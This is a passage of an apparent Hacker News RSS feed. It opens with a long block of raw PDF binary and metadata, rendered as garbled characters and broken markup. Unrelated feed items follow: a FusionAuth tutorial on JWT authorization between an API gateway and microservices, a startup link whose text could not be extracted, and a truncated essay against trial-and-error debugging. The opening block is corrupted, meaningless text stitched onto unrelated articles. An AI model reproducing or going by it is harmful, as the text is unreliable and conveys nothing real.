H‰ÌWYoãF~×¯è§…ŒÚìæÁÚò8ãA¼ãDBöÁ›Z‡ÅŒD+•ÿû­®ê‹ÔaÏìËe6»ëê¯¾ªºš..›¶Z–³–ýøãÅeÛ–³ÕbÎ.¦Ï[öÇÅÕÕóWö�&amp;¼Hc–É”K‘²$‰yž³,Iy!$ìšìÛ—í‚]|X”óEÃ.¦øv_&gt;UuÙVÏ5ûé§«ë1\Œ'!›íXÈØnV.¦Ó�	6]B†	›ÎØHýK_H…°~3ø‹cž²éfð09&gt;’
7A¬•z´í".x°ç@H.ØpÉ‚‚ðuE_Ù¿ƒ„
W�µ”µ:»þ˜~„Ê„µƒ…úw&gt;²`úç@Ûå[(%cÚó0¼Y#ÐöŒ@Z³ÇŸ•4/=ÙOã®hé÷Ø¨Š¬ªB	y"Œ¦wèžJ/zÂ%�_³{l$¸”¸ëæò†j�0<kŒvqp·pÄ ³ŽÂ‘Õè�a÷:4#ým9s="" rj‰y–(hŒ‚„Âc"ø�w:ÊñÖ{ÊÃôŒÐ÷w�Ï÷�"•wãÛkø¬a{5upª±�sŒ²cb+þ«�="" +ÀÆð‚�©x›b^x£˜Þäi‘vkª="ˆ­—7U" °À•u \Î¸q•9Ï`uÍn)9="" ¼[½soi{‘iy–Šn,¦ ="">Àa’f &gt;ei¹³Þ õCç¬Y–7Ÿ{6aÂöíYžf€&amp;Ii&gt;U¹¹¢\F¤ãfì|¯ÿ#¥T˜Ü)ì�d‡çó
~•»-rî¯q©Þ1ÙÙŒ(”Òá–D``FUÃmIä‚’½ÏdzÄc›KTÔ&nbsp;tÔ††Uz4+Õ`V?BikqßÊíføÔt©+ÍÑ
ÑõƒmñkãLÃ�súhQë–kM}è…ÈHE¡ö‚ƒræ¸ð¢,`îÊî&nbsp;m�žá
ˆe–‡áÌ2õßA¦÷6Ö½9#;–¤ñÚPº2˜¾ÔÞºËÆàáâ.�Üƒ¤&lt;2TòlH®‡@€·Íª¥F[:çÈC
(Ù�ßöævÈBŒ2Ý.ù˜Ä�øÀóÛ–ÄðCc³~]�çÞ�q–&lt;ÉYŽMä)ÎJ�¨�~ˆVÈÈãä•Ry¹
†Ô¤x+Å\DV*}šÍvA¦jöžÞÖ-¼ÂžRý*tx›S( Ïr_…X½®zñÍ¹,^ç9ó(õyNœ$ºè,ÑÙá¹ÄÇèÉŠ
â…˜ÿgïˆ\¡Ò¨‹¦Btµ¸�žï€è» �áòBnª
r¬Â}ù	q|$Cü=PyNÆÖÉÃÔÑé‘´ÿ›Bù¾%Rc÷–1'j—`:Ü»6dÝôH¯Ob–%nœ´²'“ý#Æ#SÅ¢çgÜkSú~&amp;gýÄÓžŸ­½u­YL³š|gíWÎá´vïüŽÍæŽ×Â�àØŒ*6ºä4-ÿ¦]W:vA¢î\3ÑžÏ öyg×	t¯òIz”OF6ÃÏòI"
ì€nOv@obŽÂt´ªyŒÉ?ä…GÊÿµN|Í$�=’ç–Jž(2¥þ]Àj†�]
¾é^ªßeÀÅkŒ‘@ÙËã·1Föý­Q\„ª–o�4r¶•½ñ~t§¡û*MêOºŽ@©Vaëú:ÍV%Õ5,¿5)lIý£.”Øæ0”O|üÓËk¡ ®mAé¦Ø"Mèk›ßäÆ]¯·®©õ�¢¬¿T™/¡P&amp;½A‹¾w¯uA©½®Ng_·qB­llSŒ³mHÞAÈxd[�E€¦ï0ÀÞ„FX«ˆÅW†Ë‘ñJŠö=ŽN{e˜6#‚u5CWïô¡Âœ$YT:¨¶&lt;ù
Ÿ•å
¾G†Á
4Á‰·t©¸¶Ä'�Ù”¾èg4I¯q`l¨½bÕh‡õoCöýEXAIôeŽ/Ük+1jÞÕ|&nbsp;è�pH�§~©–UÞ±’xÑ=¿=¶Ùó0zdàmÃ0•ÍüDüL-ÆótUÕÎ}ÑB¶Ê<rÙ´˜u¸gå–Éõõ?>ºÛ£��;ÞTm§Æ«ƒ©…Ð¦Ç&nbsp;…‘ƒ÷eÎÓÌàqìÂCpk*r¸d?+[ª5éDÃtç1ÅíÞUhXô�æ³³’Šî/UýÙRbn(ñb&lt;l¶SæAUâ’i–dÄ”]~DÿFd¿‡ŒÖŸ1³Ý0…Iü?ýS³ýŠ‹Ø`O/;qUÔ­7ÖHm&lt;È4o”Î)U6'Û²¶~~áOBtMûâJ°£xÅ¼€Æ3N96†C®[þ¤W€ÎÇIUŠ8æ2f"•J 6š®ùµü;iã7Ï±Èx†õiøñd¹‡‚Yä§gÑ+€<j <="" ÷’Ç¦fã¦Ì 9£Ý²°}b="" À§–�è#Çb="" r¥l·ÄŸ®ë1Ð{šŸ«ë¿\="Ï_\4Ï�‘õíÈ<å€Èƒ'Lð¢Ãàei/vgšîš¦kÄóÆuÎ„f\Õ­äï�t­5åµß'´®o\ïZ·ÝvTqdª;UÌº¹Îž'Í·ð[�jTçuÎµWäÁ(!µ™Ö$A6u²úo•�®šS_„{Öº3ðxaîs±õ%ö@K¿Mñ#p‚=©]ˆ(ÄŸ‚¨[îÊ†ÔÝ½s5ŽvPi­¶´qM�.§fxóii¾<$þOdpì*Qñ£«Š" “*$×ß©Æˆ\¦…ŸŸù‘é="" ;˜z˜Ïü©©ñ‘jÇÏcù�ÐîÆ½ƒlÝ‘`q×õÊv$‚@¦"usù«="" ÓÀ_¤?ø1m4•jÆè&¨p£Ðß½zwª³šhiØ�ÐmÓ="" ‰¸öz…ëûÖ oÐxŸÛv="" ­Ýh°Ì(iˆu‹0ûäujƒ^wfú©cÜs±="">ÆÊ÷«[ñ	‰J—Å¢í×\’8.K¤É’D–¯"ùˆ?‹Ã¯l”Ñ;tƒ�fÓP&nbsp;!}pf<l±éæ,ú¸ìqã¨à‘`nc–#.¬ï[mŠh2Ú¯‰l 81="" ½èibÓéÀ”u¶lóµ-5ów="?¤býs~ß�n€iÊ�«™<ìàN6o]ý" ”Äsêåõê¬w·gza7="" ¸v°«?æi|Ö€èŒxØób}xék¯“ØŸ*Ó¼ÛnÂhz="">"ñÙˆ¤²;CöÒ°¡ú†¡YÞ/Ì€Å.©Pá²1
(zš*='*Ï;*
K‚¥ÍoMg˜e=–�¡¯9ëprÆa:
}™¹‚
?¶1üÛxDÂªÚÙ¥wR(Ì0©K¦¡`3Çáb¨µ'¯DfÒ²½ñNO!­¡LÿúÞ'&lt;ŽÎzŸžóO{÷ý¦üöé©gs¨ôÖe¦’ÿÃPEòÿO‡*ù�S•i2yóUjlòF¨~ïï0…^°;½Öõç�¨éOD�ÓžKF4ýJà¹AlRô	žd9NåX•&gt;]›"ª­°€ø«®Ë˜¶¸R#4wúªVëÓ�ìÁUFò¤ÁÊêznª§}³p!��'*Ä“ñ¿@_Â¾°œÝ±Á_L9¦ºÆîN%«L�=a³Í@}ØD]¢n`=˜~Õ™Ó×ekž“w%
ðHäÅ+Òþ+Àš—¸
endstream
endobj
9 0 obj
&lt;&gt;stream
<!--?xpacket begin="ï»¿" id="W5M0MpCehiHzreSzNTczkc9d"?-->
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.6-c015 84.159810, 2016/09/10-02:41:30        ">
   <rdf:rdf xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpmm="http://ns.adobe.com/xap/1.0/mm/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:pdf="http://ns.adobe.com/pdf/1.3/" xmlns:pdfx="http://ns.adobe.com/pdfx/1.3/">
         <xmp:modifydate>2019-01-18T13:13:43-05:00</xmp:modifydate>
         <xmp:createdate>2019-01-18T13:11:18-05:00</xmp:createdate>
         <xmp:metadatadate>2019-01-18T13:13:43-05:00</xmp:metadatadate>
         <xmp:creatortool>Acrobat PDFMaker 15 for Word</xmp:creatortool>
         <xmpmm:documentid>uuid:94187431-f8c4-40b7-bdb3-fa92848afafd</xmpmm:documentid>
         <xmpmm:instanceid>uuid:96c8373f-a802-…</xmpmm:instanceid></rdf:description></rdf:rdf></x:xmpmeta></l±éæ,ú¸ìqã¨à‘`nc–#.¬ï[mšh2ú¯‰l></j></rù´˜u¸gå–éõõ?></kœvqp·pä></p></qœzq|žañ<±q"æòám�7ž¤z‹a,j�†ú‘¢³$fàgóšqða—p€ëdæä¾yq¼q3�´~ayhåcò“íhø°ç½†@r€0³(câµû†kÿsàj£á`û#›²úì8äqe3‚_�ïû,ab‚'ìp‡§0®0 (></q.¼ñˆt0ü‰µ#®@n“ ‹�{nhs()></vˆñä"céhà)þ\g*‡î„ë~ãp7‚¬÷></l¶šµò­·¯uá*~ˆóx!"ö></ejò‚èôùæ�ìc÷§q></sœx‚zc)v:&è\´;{âdéç)jq(f"¯”èƒã³†ä1¤ˆïyôç°òˆ8l9ù&»�_ÿœããâ²^žòþåñçeœôcnø£¤˜†w%nõiºd\ÿ�ç;¬€o6:ê]-></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019">https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019</a></em></p>]]>
            </description>
            <link>https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077762</guid>
            <pubDate>Fri, 13 Nov 2020 01:28:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealth edtech startup just raised a $4.3M seed – here's their Notion page]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077615">thread link</a>) | @jcs87
<br/>
November 12, 2020 | https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0 | <a href="https://web.archive.org/web/*/https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Wes-and-Gagan-s-new-startup-bf8ae789fded4753b0f54a85ce5315c0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077615</guid>
            <pubDate>Fri, 13 Nov 2020 01:11:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JWT Authorization in a Microservices Gateway]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077446">thread link</a>) | @mooreds
<br/>
November 12, 2020 | https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/ | <a href="https://web.archive.org/web/*/https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>In a recent article, we set up an API gateway with microservices for an eCommerce enterprise. FusionAuth handled our centralized authentication and then we passed user details for authorization to the microservices.</p>

<!--more-->

<p>In this article, we’ll build on the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway">example project</a> from that article, focusing on tightening up security by implementing <a href="https://tools.ietf.org/html/rfc7519">JSON Web Token</a> (JWT) authorization. This is a critical security concern because we don’t want to allow just any application to call our microservices. You may want to re-read the <a href="https://fusionauth.io/blog/2020/09/15/microservices-gateway/">Centralized Authentication with a Microservices Gateway</a> post to refresh your memory. And we’ve created a new <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway-jwtauth">sample project</a> with updated source code based on this article.</p>

<p>Even though we’re allowing public access to the Product Catalog, we still want that traffic to come through our gateway application. That will ensure centralized access to our Product Catalog, and our microservices will be more protected.</p>

<p>So here’s what we’ll do:</p>

<ul>
  <li>Add the <code>jsonwebtoken</code> package to our gateway and microservices.</li>
  <li>Utilize FusionAuth’s HMAC default signing key to create <a href="https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/">signed JWTs</a> for the gateway to pass to the microservices.</li>
  <li>Add roles to this JWT if the user is present.</li>
  <li>Decode that JWT in each of the microservices, using the same signing key, to verif the request.</li>
</ul>

<p>This JWT will take the place of the API key used to ensure only the gateway accesses these services. Because it is a JWT, it can contain additional information for the microservices.</p>

<h2 id="jwt-authorization">JWT Authorization</h2>

<p>JWTs are a standardized method for securely passing claims between two parties, allowing that information to be verified by the recipient. We’re going to use them for the purpose of authorization (authorizing the gateway to access the microservices) as well as passing information (user claims, such as role membership).</p>

<p>If you are going to make the code changes, clone the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway-jwtauth">example project</a>, otherwise feel free to follow along conceptually.</p>

<p>In your gateway application, install <code>jsonwebtoken</code>:</p>



<p>Next we’ll head over to FusionAuth to get our key for signing the JWT.</p>

<h3 id="signing-the-jwt-using-fusionauths-key">Signing the JWT using FusionAuth’s key</h3>
<p>By signing JWTs using FusionAuth’s default signing key, we’re effectively limiting access to applications that have the key, thus allowing private microservices to ensure the incoming message is from a trusted caller: the gateway.</p>

<p>Because we control all the microservices, we’ll use a symmetric signing algorithm, such as HMAC. We could also use a public/private key signing algorithm, such as RSA, which would be less performant but wouldn’t require us to share a secret between the signer of the JWT and its consumers.</p>

<p>To access your FusionAuth default signing key, go to <strong>Settings &gt; Key Master</strong>, click on the magnifying glass next to the key with the name “Default signing key”, then reveal it and copy the value of the “Secret”.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/microservices-jwt-auth/signing-key-secret.png" alt="Finding the JWT signing key value."></p>

<p>Now we add this value as a variable to the gateway application (in <code>/routes/index.js</code>) and require the <code>jsonwebtoken</code> library.</p>

<p>In production applications, avoid storing secrets in code. Instead, use a separate secrets store and obtain the secret from that store at runtime. Below we illustrate how to pull this value from an environment variable, which is a good option for some deployment environments.</p>

<div><div><pre><code><span>// ...</span>
<span>const</span> <span>jwtSigningKey</span> <span>=</span> <span>'</span><span>[Default Signing Key]</span><span>'</span><span>;</span>
<span>const</span> <span>jwt</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>jsonwebtoken</span><span>'</span><span>);</span>
<span>// ...</span>
</code></pre></div></div>

<p>Next, we’ll add a function at the end of that file to get the gateway <code>Bearer</code> token which will then be forwarded to the microservices. In this case, we are setting the token to expire in ten minutes. This is a common duration of the JWT, but you may want to reduce it for security concerns, as described in FusionAuth’s article on <a href="https://fusionauth.io/learn/expert-advice/tokens/revoking-jwts/">Revoking JWTs &amp; JWT Expiration</a>.</p>

<div><div><pre><code><span>// ...</span>
<span>function</span> <span>getGatewayBearerToken</span><span>(</span><span>req</span><span>)</span> <span>{</span>
  <span>// Recall that we put the User in the session in the previous post, but they might not be logged in so protect this code</span>
  <span>// from a null User. </span>
  <span>var</span> <span>user</span> <span>=</span> <span>req</span><span>.</span><span>session</span><span>.</span><span>user</span><span>;</span>
  <span>var</span> <span>token</span> <span>=</span> <span>jwt</span><span>.</span><span>sign</span><span>({</span> <span>data</span><span>:</span> <span>req</span><span>.</span><span>url</span><span>,</span> <span>roles</span><span>:</span> <span>user</span> <span>!==</span> <span>null</span> <span>?</span> <span>user</span><span>.</span><span>registrations</span><span>[</span><span>0</span><span>].</span><span>roles</span> <span>:</span> <span>null</span> <span>},</span> <span>jwtSigningKey</span><span>,</span> <span>{</span> <span>expiresIn</span><span>:</span> <span>'</span><span>10m</span><span>'</span><span>,</span> <span>subject</span><span>:</span> <span>'</span><span>gateway</span><span>'</span><span>,</span> <span>issuer</span><span>:</span> <span>req</span><span>.</span><span>get</span><span>(</span><span>'</span><span>host</span><span>'</span><span>)</span> <span>});</span>
  <span>return</span> <span>'</span><span>Bearer </span><span>'</span> <span>+</span> <span>token</span><span>;</span>
<span>}</span>
<span>// ...</span>
</code></pre></div></div>

<p><code>getGatewayBearerToken()</code> creates a bearer token valid for ten minutes and utilizes our public signing key. It’s how we will provide secure, general access between the gateway and any microservices which don’t require any further authorization. All this JWT is guaranteeing is that the request for the API came through the gateway.</p>

<h2 id="gateway-router-integration">Gateway Router Integration</h2>
<p>For the Product Catalog routes, we’ll use <code>getGatewayBearerToken()</code> to prepare the <code>Bearer</code> token and attach it to the <code>authorization</code> header.</p>

<div><div><pre><code><span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/products</span><span>'</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>const</span> <span>bearerToken</span> <span>=</span> <span>getGatewayBearerToken</span><span>(</span><span>req</span><span>);</span>
  <span>const</span> <span>options</span> <span>=</span> <span>{</span>
    <span>url</span><span>:</span> <span>`</span><span>${</span><span>productUrl</span><span>}</span><span>/products`</span><span>,</span>
    <span>headers</span><span>:</span> <span>{</span> <span>authorization</span><span>:</span> <span>bearerToken</span> <span>}</span>
  <span>};</span>
  <span>request</span><span>(</span><span>options</span><span>).</span><span>pipe</span><span>(</span><span>res</span><span>);</span>
<span>});</span>
</code></pre></div></div>

<p>Let’s update one other route in the API Gateway. This is the protected route that requires the user to be logged in and authenticated. We will pass a <code>Bearer</code> token that contains roles down to the microservices:</p>

<div><div><pre><code><span>// ...</span>
<span>/* PRODUCT INVENTORY ROUTES */</span>
<span>// The checkAuthentication function was defined in our last post and it ensures that the user is logged in or redirects</span>
<span>// them to FusionAuth to login.</span>
<span>router</span><span>.</span><span>get</span><span>(</span><span>'</span><span>/branches/:id/products</span><span>'</span><span>,</span> <span>checkAuthentication</span><span>,</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
  <span>const</span> <span>bearerToken</span> <span>=</span> <span>getGatewayBearerToken</span><span>(</span><span>req</span><span>);</span>
  <span>const</span> <span>options</span> <span>=</span> <span>{</span>
    <span>url</span><span>:</span> <span>`http://localhost:3002/branches/</span><span>${</span><span>req</span><span>.</span><span>params</span><span>.</span><span>id</span><span>}</span><span>/products`</span><span>,</span>
    <span>headers</span><span>:</span> <span>{</span> <span>authorization</span><span>:</span> <span>bearerToken</span> <span>}</span>
  <span>};</span>
  <span>request</span><span>(</span><span>options</span><span>).</span><span>pipe</span><span>(</span><span>res</span><span>);</span>
<span>});</span>
<span>// ...</span>
</code></pre></div></div>

<p>You can see that this code is nearly identical to the code for <code>/products</code> above. Since both APIs in the Gateway create a JWT and pass it down to the Microservices, they use the same method to authenticate and authorize API calls. Having everything be the same in the API Gateway is definitely a good thing and we could even extract the JWT creation code out to a middleware at some point.</p>

<h2 id="microservice-jwt-integration">Microservice JWT Integration</h2>

<p>We’re now ready for the microservices to handle the <code>Bearer</code> token passed in the header. As each microservice will need to handle the tokens in the same way, it makes sense to create a package utility that can be shared by each microservice. For example, here’s the flow of a request to the Product Catalog:</p>

<figure>
        <img src="https://fusionauth.io/assets/img/diagrams/blogs/jwt-authorization-microservices/catalog-flow.svg" alt="Retrieving the Product Catalog.">
        <figcaption>Retrieving the Product Catalog.</figcaption>
      </figure>

<h3 id="authorization-middleware">Authorization Middleware</h3>

<p>Here we’ll just cover the contents of the utility, as the <a href="https://docs.npmjs.com/creating-node-js-modules">package creation</a> is a little out of scope for this article. For convenience, we’ve included this in a <code>shared</code> folder in the <a href="https://github.com/FusionAuth/fusionauth-example-node-services-gateway-jwtauth">sample project</a>.</p>

<div><div><pre><code><span>const</span> <span>jwt</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>jsonwebtoken</span><span>'</span><span>);</span>

<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>function</span><span>(</span><span>options</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span><span>(</span><span>req</span><span>,</span> <span>res</span><span>,</span> <span>next</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      <span>const</span> <span>authorization</span> <span>=</span> <span>req</span><span>.</span><span>headers</span><span>.</span><span>authorization</span><span>;</span>
      <span>if</span> <span>(</span><span>!</span><span>authorization</span><span>)</span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>Authorization header missing. Denying request.</span><span>'</span><span>)</span>
        <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
        <span>return</span><span>;</span>
      <span>}</span>

      <span>const</span> <span>bearer</span> <span>=</span> <span>authorization</span><span>.</span><span>split</span><span>(</span><span>'</span><span> </span><span>'</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>bearer</span> <span>||</span> <span>bearer</span><span>.</span><span>length</span> <span>!=</span> <span>2</span><span>)</span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>Bearer header value malformed. Denying request.</span><span>'</span><span>)</span>
        <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
        <span>return</span><span>;</span>
      <span>}</span>

      <span>token</span> <span>=</span> <span>bearer</span><span>[</span><span>1</span><span>];</span>
      <span>if</span> <span>(</span><span>!</span><span>token</span><span>)</span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>Token not provided. Denying request.</span><span>'</span><span>)</span>
        <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
        <span>return</span><span>;</span>
      <span>}</span>

      <span>const</span> <span>decoded_token</span> <span>=</span> <span>jwt</span><span>.</span><span>verify</span><span>(</span><span>token</span><span>,</span> <span>options</span><span>.</span><span>jwtSigningKey</span><span>);</span>
      <span>req</span><span>.</span><span>roles</span> <span>=</span> <span>decoded_token</span><span>.</span><span>roles</span><span>;</span> <span>// These could be null if the user isn't logged in</span>

    <span>}</span> <span>catch</span><span>(</span><span>err</span><span>)</span> <span>{</span>
      <span>console</span><span>.</span><span>error</span><span>(</span><span>err</span><span>);</span>
      <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>);</span>
      <span>return</span><span>;</span>
    <span>}</span>

    <span>next</span><span>();</span>
  <span>}</span>
<span>};</span>

<span>function</span> <span>handleUnauthorized</span><span>(</span><span>res</span><span>,</span> <span>options</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>options</span><span>.</span><span>loginRedirectUrl</span><span>)</span> <span>{</span>
    <span>res</span><span>.</span><span>redirect</span><span>(</span><span>options</span><span>.</span><span>loginRedirectUrl</span><span>)</span>
  <span>}</span>
  <span>else</span> <span>{</span>
    <span>res</span><span>.</span><span>status</span><span>(</span><span>401</span><span>).</span><span>json</span><span>({</span>
      <span>status</span><span>:</span> <span>401</span><span>,</span>
      <span>message</span><span>:</span> <span>'</span><span>UNAUTHORIZED</span><span>'</span>
    <span>})</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>We’re exporting a function that looks for the <code>Authorization</code> header key coming from the gateway. It goes through the following steps:</p>

<ol>
  <li>Find the <code>authorization</code> header</li>
  <li>Split the value it finds (giving us <code>Bearer</code> and the token)</li>
  <li>Grab the token portion</li>
  <li>Verify and decode the token using the <code>jwtSigningKey</code></li>
</ol>

<p>If all those steps are successful, we’ll end up with a decoded token. And if there were roles included, they will be added to <code>req</code>. For any errors in the process, the <code>handleUnauthorized</code> function will redirect to the login page and/or respond with a <code>401: UNAUTHORIZED</code>.</p>

<p>Why do we care about roles? For correct authorization in the Product Inventory service, we want to ensure a request is made with the correct role. We’ll explore that after we examine the Product Catalog integration.</p>

<h3 id="product-catalog-integration">Product Catalog Integration</h3>
<p>We have our <code>authorizationMiddleware</code> in place, and it’s pretty simple to integrate it into the Product Catalog microservice (in <code>app.js</code>):</p>

<div><div><pre><code><span>const</span> <span>{</span> <span>JWT_SIGNING_KEY</span><span>,</span> <span>LOGIN_REDIRECT_URL</span> <span>}</span> <span>=</span> <span>process</span><span>.</span><span>env</span><span>;</span>
<span>var</span> <span>authorizationMiddleware</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>authorization-middleware</span><span>'</span><span>);</span> <span>// assuming it's packaged under that name</span>

<span>// ...</span>
<span>app</span><span>.</span><span>use</span><span>(</span><span>authorizationMiddleware</span><span>({</span> <span>jwtSigningKey</span><span>:</span> <span>JWT_SIGNING_KEY</span><span>,</span> <span>loginRedirectUrl</span><span>:</span> <span>LOGIN_REDIRECT_URL</span> <span>}));</span>
<span>app</span><span>.</span><span>use</span><span>(</span><span>'</span><span>/</span><span>'</span><span>,</span> <span>indexRouter</span><span>);</span>
<span>//...</span>
</code></pre></div></div>
<p>Note that we’re using the <code>authorizationMiddleware</code> prior to the <code>indexRouter</code>, which will ensure the middleware is applied to all our routes.</p>

<p>Remember that we’re using the <code>jwtSigningKey</code> to verify the JWT has been signed with the FusionAuth default signing key. Above, we manually pasted the string in, but here we’ve implemented it as an environment variable. This is better than hard-coding the key in code.</p>

<p>In your local environment, you can add your <code>JWT_SIGNING_KEY</code> to your <code>bash_profile</code> or export it to your environment:</p>
<div><div><pre><code><span>export </span><span>JWT_SIGNING_KEY</span><span>=[</span>Default Signing Key]
</code></pre></div></div>

<p>Make sure you restart your microservices after you’ve set this environment variable.</p>

<h2 id="product-inventory-integration">Product Inventory Integration</h2>
<p>The Product Inventory service endpoint, <code>/branches/:id/product</code> has role-based access. Previously we were pulling that from a FusionAuth generated JWT, but let’s pull …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/">https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/</a></em></p>]]>
            </description>
            <link>https://fusionauth.io/blog/2020/11/12/jwt-authorization-microservices-gateway/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077446</guid>
            <pubDate>Fri, 13 Nov 2020 00:51:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don’t Be an Evolutionary Programmer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077333">thread link</a>) | @whack
<br/>
November 12, 2020 | https://software.rajivprab.com/2018/04/29/dont-be-an-evolutionary-programmer/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2018/04/29/dont-be-an-evolutionary-programmer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><a href="https://www.flickr.com/photos/45752180@N03/5465488239" target="_blank" rel="noreferrer noopener"><img data-attachment-id="173" data-permalink="https://software.rajivprab.com/5465488239_bd90ac9589_z/" data-orig-file="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg" data-orig-size="556,369" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="5465488239_bd90ac9589_z" data-image-description="" data-medium-file="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg?w=300" data-large-file="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg?w=556" src="https://softwarerajivprab.files.wordpress.com/2019/07/5465488239_bd90ac9589_z.jpg" alt=""></a></figure></div>



<p><span>When you run into a problem, a bug in your code, how do you try to fix it?</span></p>



<p><span>Do you try to debug the problem, in order to figure out what the root cause is? Do you use tools like debuggers, loggers or code inspections, in order to better understand where and what is causing the problem, and then carefully analyze the best way to fix it?</span></p>



<p><span>Or do you make random changes to random parts of your code, see if that fixes anything, and repeat the above loop over and over again until things start working?</span></p>



<p><span>I like to call the latter approach </span><i>“</i><i><span>Evolutionary Programming</span></i><span>“. Comparing this style of programming to evolution is probably giving it too much credit, but it’s actually a pretty apt analogy. Evolution, through random mutation and natural selection, is the polar opposite of </span><a rel="noopener" href="https://en.wikipedia.org/wiki/Intelligent_design" target="_blank">Intelligent Design</a><span>. Evolution has no sense of analysis, design or intelligence. It simply mutates random portions of your code (DNA), keeps the changes that “made things better,” discards the rest, and keeps looping through this forever until it gets to something successful.</span></p>



<p><span>Such an evolutionary approach is already being used in specific subdomains, such as </span><a href="https://en.wikipedia.org/wiki/Machine_learning" target="_blank" rel="noopener">Machine Learning</a><span> and AI development. Maybe one day, someone will figure out how to make the evolutionary approach work in mainstream Java programming as well. However, that day is certainly not today. If you’re a programmer and your personal approach to fixing bugs is to rely on the Evolutionary Method, don’t. You’re doing something very very wrong.</span></p>



<p><i><span>“But evolution works”</span></i><span> you may argue. </span><i><span>“If it can produce something as complex as human beings, why not use that same method in my daily programming?”</span></i><span> Well, consider this:</span></p>



<ul><li>It took evolution a billion years to accomplish what software developers were able to accomplish in decades. That’s a 10000000x difference in development velocity.</li><li><span>The end-product of evolution is something so complex, that no human mind can understand it. Consider the </span>millennia<span> that men have spent studying biology &amp; medicine, and we’ve only just started to scratch the surface in the past century.</span></li><li><span>The systems produced by evolution are so interconnected and tightly coupled, that it’s impossible to fix one problem with introducing 100 others. If you need proof of this, look at the list of side-effects that accompany any medical drug.</span></li></ul>



<p><span>I bring up this topic, because I just witnessed it first hand during an interview with an undoubtedly bright candidate. After 40 minutes of building a complex data-structure, it came time to test his creation. He knocked a few easy bugs out of the way in the first few iterations, but hit a brick wall on a more complicated bug. </span></p>



<p><span>Instead of digging deeper into the code in order to understand what it was doing, or using the debug tools in order to narrow down the specific code-block which was showing buggy behavior, he decided to fork off an evolutionary branch. He started mutating random parts of his code, and rerunning, just to see if that somehow fixed things. After 15 minutes without any progress whatsoever, he gave up and was even more confused than when he started.</span></p>



